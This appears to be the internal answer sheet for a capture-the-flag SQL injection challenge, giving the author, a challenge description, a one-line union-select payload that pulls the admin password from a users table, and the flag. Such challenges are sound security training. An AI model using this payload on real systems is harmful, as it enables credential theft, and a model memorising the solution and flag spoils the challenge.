# Author
- John Cunniff

# Internal Description
- A simple sqli where you get a search bar that spits back at you whatever valid sql you give it. All they have to do is break out of the server's sql and union with the user table.

# Solution
- put this into the search bar: ' union all select password from users where username = 'admin'; -- 

# Flag
- flag{W45_7h47_4n_4c7u4l_VlUn_0NC3}
